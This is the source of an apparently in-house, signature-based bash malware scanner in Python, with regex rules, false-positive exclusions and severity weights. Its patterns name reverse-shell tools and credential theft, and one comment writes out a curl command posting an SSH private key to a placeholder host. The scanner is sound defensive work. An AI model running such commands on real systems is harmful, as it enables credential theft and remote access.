"""Custom bash malware scanner; Layer 1 (static/signature), doc 03.

No adequate free bash-specific scanner exists, so this is our own (doc 03 sec 1).
Layer 1 inspects code without executing it, across the full attack surface
(doc 03 sec 2): enumeration, persistence, lateral movement, exfiltration,
reverse shells, process injection, credential harvesting, network scanning, and
obfuscation/evasion. It recursively finds bash and bash-bearing files; shell
embedded in setup scripts, CI workflows, Dockerfiles (doc 03 sec 4); and emits
per-file, categorized findings (doc 03 sec 5).

Layer 2 (sandboxed behavioral execution, doc 03 sec 3.2) is deliberately out of
scope here; it is the heavy lift and lands later.

Pure functions over text/paths: fully unit-testable with no execution.
"""

from __future__ import annotations

import re
from dataclasses import dataclass
from pathlib import Path

# Per-category severity weight (reverse shells / exfil / download-exec are the
# strongest signals; enumeration is common and weak on its own).
_WEIGHTS = {
    "reverse_shell": 5,
    "download_exec": 4,
    "exfiltration": 4,
    "obfuscation": 3,
    "persistence": 3,
    "credential_harvest": 3,
    "process_injection": 3,
    "lateral_movement": 2,
    "network_scan": 2,
    "enumeration": 1,
}

# Category -> (rule name, regex). Case-insensitive, matched per line.
_RULES: dict[str, list[tuple[str, re.Pattern]]] = {
    "reverse_shell": [
        ("dev-tcp-redirect", re.compile(r"/dev/tcp/|/dev/udp/", re.I)),
        # shai-hulud-detect FP (2026-07-02): "${NC}"/"$NC" is the ubiquitous
        # shell convention for a "No Color" ANSI reset variable, which an
        # unrelated "-e" later on the same line (e.g. prose about Bash's
        # `set -e`) then completed into a false nc-exec match. The negative
        # lookbehind excludes "nc"/"NC" as a variable reference; a real
        # `nc -e ...` invocation (never preceded by `{`/`$`) still matches.
        ("nc-exec", re.compile(r"(?<![{$])\bn(?:c|cat)\b[^\n]*\s-e\b", re.I)),
        ("bash-i-socket", re.compile(r"bash\s+-i\b[^\n]*(>&|2>&1)", re.I)),
        ("mkfifo-shell", re.compile(r"mkfifo[^\n]*\b(nc|ncat|sh|bash)\b", re.I)),
        ("python-reverse", re.compile(r"socket\.socket[^\n]*(connect|SOCK_STREAM)", re.I)),
    ],
    "download_exec": [
        # curl|bash is dangerous from an ATTACKER host, but it is ALSO the standard
        # install idiom for reputable toolchains (`curl -fsSL deb.nodesource.com/...
        # | bash` in a Dockerfile). The negative lookahead excludes a pipe-to-shell
        # whose fetch targets a well-known installer host, so a normal Docker build
        # no longer confirms as download-and-execute (2026-07-06 docker FP audit).
        ("curl-pipe-shell", re.compile(
            r"(?!(?:curl|wget)\b[^\n|]*\b(?:deb\.nodesource\.com|deb\.debian\.org|"
            r"archive\.ubuntu\.com|security\.ubuntu\.com|get\.docker\.com|"
            r"download\.docker\.com|sh\.rustup\.rs|rustup\.rs|get\.helm\.sh|"
            r"apt\.llvm\.org|packages\.microsoft\.com|bun\.sh|astral\.sh|"
            r"install\.python-poetry\.org)\b)"
            r"(curl|wget)\s[^\n|]*\|\s*(sh|bash|python|perl)", re.I)),
        ("fetch-then-exec",
         re.compile(r"(curl|wget)\s[^\n]*-o\s*\S+[^\n]*;\s*(sh|bash|chmod)", re.I)),
    ],
    "exfiltration": [
        ("discord-webhook", re.compile(r"discord(?:app)?\.com/api/webhooks/", re.I)),
        ("telegram-bot", re.compile(r"api\.telegram\.org/bot", re.I)),
        # curl/wget POSTING or UPLOADING a secret FILE is credential exfil (the
        # data is the tell, not the host): `curl -d @~/.ssh/id_rsa http://x`.
        ("secret-exfil", re.compile(
            r"\b(?:curl|wget)\b[^\n]*(?:-d|--data(?:-binary)?|-F|--form|-T|--upload-file)"
            r"[^\n]*(?:id_rsa|id_ed25519|\.ssh/|\.aws/credentials|/etc/shadow|/etc/passwd|"
            r"\.env\b|credentials?\.(?:json|ya?ml)|secrets?\.(?:json|ya?ml|txt))", re.I)),
        # The exfil flags are case-SENSITIVE: -d (data), -F (form), -T (upload).
        # Matching them under re.I made curl's ubiquitous benign -f ("fail
        # silently", as in every `curl -f http://localhost/health` Docker
        # HEALTHCHECK) collide with -F and confirm as exfiltration. The (?-i:)
        # scope keeps -f benign while curl/Curl still matches (2026-07-06 FP audit).
        ("curl-post-data",
         re.compile(r"\bcurl\b.*(?-i:\s-[dFT]\b|\s--data\b|\s--upload-file\b)", re.I)),
        ("archive-then-send", re.compile(r"(tar|zip|gzip)\b[^\n]*\|\s*(curl|nc|wget)", re.I)),
    ],
    "persistence": [
        ("cron", re.compile(r"\bcrontab\b|/etc/cron|@reboot", re.I)),
        ("rc-files", re.compile(r">>\s*~?/?\.?(bashrc|bash_profile|profile|zshrc)\b", re.I)),
        ("systemd", re.compile(r"systemctl\s+enable|/etc/systemd/system/", re.I)),
        ("authorized-keys", re.compile(r"\.ssh/authorized_keys", re.I)),
        ("rc-local", re.compile(r"/etc/rc\.local|launchctl\s+load", re.I)),
    ],
    "credential_harvest": [
        ("ssh-keys", re.compile(r"id_rsa|id_ed25519|\.ssh/id_", re.I)),
        ("cloud-creds", re.compile(r"\.aws/credentials|\.config/gcloud|\.azure/", re.I)),
        # READING/exfiltrating /etc/shadow (password hashes) is theft; but
        # CIS-hardening scripts legitimately chmod/chown/stat/ls it (2026-07-02
        # audit FP). Require a read/copy/exfil verb, or a pipe/redirect out, so a
        # permission-management line no longer confirms. /etc/passwd is
        # benign/ubiquitous and never flagged.
        ("shadow-read", re.compile(
            r"\b(?:cat|less|more|head|tail|cp|scp|rsync|dd|xxd|strings|od|base64|"
            r"awk|sed|nc|curl|wget|tar|zip|gzip)\b[^\n]*/etc/shadow"
            r"|/etc/shadow\b[^\n]*(?:\||>>?|curl|wget|\bnc\b)", re.I)),
        ("env-token-grab", re.compile(r"\b(AWS_SECRET|GITHUB_TOKEN|NPM_TOKEN|API_KEY)\b", re.I)),
    ],
    "process_injection": [
        # LD_PRELOAD is legitimately used to preload memory allocators and
        # sanitizers (jemalloc/tcmalloc/mimalloc, libasan, ...) -- extremely
        # common in Dockerfiles (the aristoteleo/pantheonos FP, 2026-07-02 was
        # `LD_PRELOAD=.../libjemalloc.so.2`). The negative lookahead suppresses
        # the match when a well-known-legit library is on the same line; a real
        # `LD_PRELOAD=/tmp/evil.so` (no such name) still fires.
        ("ld-preload", re.compile(
            r"(?!.*lib(?:jemalloc|tcmalloc|mimalloc|hugetlbfs|asan|tsan|ubsan|lsan|"
            r"gomp|faketime|eatmydata|umem|profiler|Segfault))\bLD_PRELOAD\b", re.I)),
        ("ptrace-mem", re.compile(r"/proc/\d+/mem|\bptrace\b", re.I)),
        ("gdb-attach", re.compile(r"gdb\s+-p\b", re.I)),
    ],
    "lateral_movement": [
        ("sshpass", re.compile(r"\bsshpass\b", re.I)),
        ("remote-exec", re.compile(r"\b(psexec|wmiexec|pscp)\b", re.I)),
    ],
    "network_scan": [
        ("scanner", re.compile(r"\b(nmap|masscan|zmap)\b", re.I)),
        ("port-sweep", re.compile(r"nc\s+-z\b", re.I)),
    ],
    "enumeration": [
        ("host-recon", re.compile(r"\b(uname\s+-a|whoami|hostname|id)\b", re.I)),
        ("net-recon", re.compile(r"\b(ifconfig|ip\s+addr|netstat|ss\s+-)\b", re.I)),
    ],
    "obfuscation": [
        ("base64-decode-exec", re.compile(r"base64\s+(-d|--decode)[^\n]*\|\s*(sh|bash)", re.I)),
        ("eval-base64", re.compile(r"eval\s[^\n]*base64", re.I)),
        ("hex-escapes", re.compile(r"(?:\\x[0-9a-fA-F]{2}){6,}")),
        ("ifs-obfuscation", re.compile(r"\$\{IFS\}")),
        ("eval-subshell", re.compile(r"eval\s+[\"']?\$\(")),
    ],
}

# Files that carry shell even without a .sh extension (doc 03 sec 4).
_BASH_BEARING_NAMES = {"dockerfile", "makefile", "setup.py", "package.json"}
_BASH_SUFFIXES = {".sh", ".bash", ".ksh", ".zsh"}
_EMBEDDED_SUFFIXES = {".yml", ".yaml"}  # CI workflows etc.
_SHEBANG = re.compile(r"^#!.*\b(ba|z|k)?sh\b")
_MAX_BYTES = 1_000_000

# Paths that are NOT the repo author's executable payload. Two kinds:
#   * Vendored/generated trees (THIRD-PARTY code); the tiledesk FP came from
#     `node_modules/bytes` and `node_modules/content-disposition`.
#   * Test / fixture / example trees, which legitimately contain attack strings
#     as data; the crewhaus FP came from a prompt-injection DETECTOR whose
#     `index.test.ts` cites `webhook.site` / telegram as test fixtures.
# Excluding both means only first-party, shipped code can confirm a finding.
# (Names are compared case-insensitively.)
_IGNORE_DIRS = frozenset({
    ".git", "node_modules", "bower_components", "vendor", "third_party",
    "third-party", "dist", "build", "out", ".next", ".nuxt", "target",
    ".venv", "venv", "virtualenv", "site-packages", "__pycache__", "pods",
    ".gradle", ".terraform", ".yarn",
    # non-payload: tests/fixtures/examples carry attack strings as DATA
    "test", "tests", "__tests__", "spec", "__spec__", "fixtures", "fixture",
    "__fixtures__", "mocks", "__mocks__", "e2e", "testdata", "examples", "example",
    # shai-hulud-detect FP (2026-07-02): a worm DETECTOR ships deliberately
    # crafted attack-simulation fixtures to prove its own detection works;
    # these are demo/proof-of-concept payloads, not the repo's real code.
    "test-cases", "test_cases", "testcases", "samples", "sample",
    "poc", "pocs", "demo", "demos",
    # THIRD-PARTY / regression-test trees in large OSS monorepos (2026-07-07 CTF
    # FPs: cheribsd `contrib/netbsd-tests/...sh` nc-exec; freebsd-ports
    # `devel/electron*/files/packagejsons/package.json` npm-preinstall). "contrib"
    # is contributed third-party code; "regress"/"atf" are BSD regression tests;
    # "packagejsons" is the ports tree's vendored npm metadata.
    "contrib", "regress", "atf", "packagejsons", "distinfo",
})
# Directory-name SUFFIXES that mark a test tree even when hyphenated/prefixed
# (netbsd-tests, atf-tests, kyua-tests, lib-tests, ...).
_TEST_DIR_SUFFIXES = ("-tests", "_tests", "-test", "_test")
# Test-file name markers (a test file can live anywhere, e.g. `src/x.test.ts`).
_TEST_FILE_MARKERS = (".test.", ".spec.", ".stories.", ".fixture.", ".mock.")
# Language-specific test-file conventions matched by SUFFIX/PREFIX (not loose
# substring, so `latest_release.py` is never mistaken for a `test_` file). The
# garagon/aguara FP (2026-07-02) confirmed on Go `*_test.go` fixtures that the
# JS-style ``.test.`` markers above did not catch.
_TEST_FILE_SUFFIXES = (
    "_test.go", "_test.py", "_test.rs", "_test.ts", "_test.js", "_test.tsx",
    "_tests.py", "_tests.rs", "_spec.rb", ".test.go",
)
_TEST_FILE_EXACT = frozenset({"conftest.py", "tests.rs", "test.rs"})


def is_test_file(name: str) -> bool:
    """True if a filename follows any language's test/fixture convention."""
    low = name.lower()
    if any(m in low for m in _TEST_FILE_MARKERS):
        return True
    if low.endswith(_TEST_FILE_SUFFIXES):
        return True
    if low.startswith("test_") and low.endswith((".py", ".rs", ".go")):
        return True
    return low in _TEST_FILE_EXACT

# Security-DATA files: a malware scanner / advisory feed carries attack strings and
# known-bad package names as DATA, not as a payload it runs. The pkgward-oss FP
# confirmed on `analyze/malware_patterns.py`; the aeon FP on a
# `.../adv_malware_raw.json` advisory cache. Like a test fixture, such a file must
# never CONFIRM a repo malicious. High-signal, security-specific filename markers
# only, so a genuine payload file is never skipped by accident.
_SECURITY_DATA_MARKERS = (
    "malware_pattern", "malware-pattern", "malware_signature", "malware-signature",
    "malware_raw", "malware_sample", "malware_db", "malwaredb",
    "attack_pattern", "attack-pattern", "attack_signature", "threat_signature",
    "yara", "ruleset", "detection_rule", "detection-rule", "_signatures.",
    "ioc_list", "ioc-list", "blocklist", "blacklist", "denylist",
    # cobenian/shai-hulud-detect + idox-genai/shai-hulud-scanner FPs
    # (2026-07-02): a Shai-Hulud-worm DETECTOR's own reference list of the
    # compromised package names it scans for, mistaken for evidence of malice.
    "compromised-package", "compromised_package", "ioc-packages", "ioc_packages",
)


def is_security_data_file(name: str) -> bool:
    """True if a filename is a malware/detection SIGNATURE or advisory DATA file.

    Such a file lists attack strings and known-bad names as reference data (a
    scanner's rule set, an advisory cache), so a match inside it is the tool doing
    its job, not the repo being malicious. Compared case-insensitively.
    """
    low = name.lower()
    return any(marker in low for marker in _SECURITY_DATA_MARKERS)


def is_ignored_path(path: Path) -> bool:
    """True if a path is vendored/generated, a test/fixture, or a security-data
    file (skip for scanning so only first-party PAYLOAD code can confirm)."""
    parts = {p.lower() for p in path.parts}
    if _IGNORE_DIRS & parts:
        return True
    # hyphenated/prefixed test trees (netbsd-tests, atf-tests, ...)
    if any(p.endswith(_TEST_DIR_SUFFIXES) for p in parts):
        return True
    name = path.name.lower()
    if is_test_file(name):
        return True
    return is_security_data_file(name)


@dataclass
class BashFinding:
    file: str
    line: int
    category: str
    rule: str
    snippet: str


def is_bash_bearing(path: Path, first_line: str) -> bool:
    """Whether a file should be scanned for shell (doc 03 sec 4)."""
    name = path.name.lower()
    if path.suffix.lower() in _BASH_SUFFIXES or name in _BASH_BEARING_NAMES:
        return True
    if path.suffix.lower() in _EMBEDDED_SUFFIXES and "workflow" in str(path).lower():
        return True
    return bool(_SHEBANG.match(first_line))


def scan_text(text: str, file: str = "<text>") -> list[BashFinding]:
    """Run every rule against each line of text. Pure."""
    findings: list[BashFinding] = []
    for lineno, line in enumerate(text.splitlines(), 1):
        for category, rules in _RULES.items():
            for rule_name, pattern in rules:
                if pattern.search(line):
                    findings.append(
                        BashFinding(file, lineno, category, rule_name, line.strip()[:200])
                    )
    return findings


def scan_repo(root: Path) -> list[BashFinding]:
    """Recursively scan a cloned repo's bash-bearing files."""
    root = Path(root)
    findings: list[BashFinding] = []
    for path in root.rglob("*"):
        if not path.is_file() or is_ignored_path(path):
            continue
        try:
            if path.stat().st_size > _MAX_BYTES:
                continue
            with path.open("r", encoding="utf-8", errors="ignore") as fh:
                content = fh.read()
        except OSError:
            continue
        first_line = content.split("\n", 1)[0] if content else ""
        if not is_bash_bearing(path, first_line):
            continue
        rel = str(path.relative_to(root))
        findings.extend(f.__class__(rel, f.line, f.category, f.rule, f.snippet)
                        for f in scan_text(content, rel))
    return findings


def score_findings(findings: list[BashFinding]) -> int:
    """Weighted score. Distinct (category, rule) pairs count once to limit spam."""
    seen = {(f.category, f.rule) for f in findings}
    return sum(_WEIGHTS.get(category, 1) for category, _ in seen)
